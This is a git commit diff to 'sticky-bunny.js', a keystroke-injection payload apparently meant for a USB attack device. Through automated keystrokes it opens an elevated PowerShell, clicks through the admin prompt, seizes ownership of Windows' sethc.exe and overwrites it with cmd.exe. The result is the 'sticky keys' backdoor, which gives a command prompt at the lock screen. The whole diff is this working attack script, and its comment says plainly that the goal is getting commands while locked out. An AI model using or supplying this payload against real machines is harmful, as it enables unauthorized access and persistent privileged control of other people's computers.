9dcb64a9ba491ecf76fcb75165c8e6edd2bfb208
Phillip Roach <108208254+philliproach@users.noreply.github.com>
2025-04-06 00:39:42 -0400

    Update sticky-bunny.js

--- payloads/security-scripts/sticky-bunny/sticky-bunny.js
+++ payloads/security-scripts/sticky-bunny/sticky-bunny.js
@@ -1,33 +1,24 @@
+//When you press shift 5 times, instead of sticky keys popping up, this script makes it so the terminal come up allowing you to enter commands while locked out of the computer
+
 layout('us');
 press("GUI r");
-delay(500);
+delay(100);
 type("powershell Start-Process powershell -Verb runAs\n")
 delay(4000);
 press("SHIFT TAB");
-delay(500);
+delay(100);
 press("ENTER");
 delay(2000);
-type("$Acl = Get-Acl sethc.exe")
-press("ENTER")
+type("$Acl = Get-Acl sethc.exe\n")
+type("$Ar = New-Object  system.security.accesscontrol.filesystemaccessrule($env:UserName,\"FullControl\",\"Allow\")\n")
+type("$Acl.SetAccessRule($Ar)\n")
+type("Set-Acl sethc.exe $Acl\n")
+type("xcopy sethc.exe sethc.exe.bak\n")
+delay(200);
+press("y")
 delay(1000);
-type("$Ar = New-Object  system.security.accesscontrol.filesystemaccessrule($env:UserName,\"FullControl\",\"Allow\")")
-press("ENTER")
+type("xcopy cmd.exe sethc.exe\n")
+delay(200);
+press("y")
 delay(1000);
-type("$Acl.SetAccessRule($Ar)")
-press("ENTER")
-delay(1000);
-type("Set-Acl sethc.exe $Acl")
-press("ENTER")
-delay(1000);
-type("xcopy sethc.exe sethc.exe.bak")
-press("ENTER")
-delay(1000);
-press("F")
-delay(1000);
-type("xcopy cmd.exe sethc.exe")
-press("ENTER")
-delay(1000);
-press("Y")
-press("ENTER")
-delay(1000);
-type("EXIT\n")
+type("exit\n")
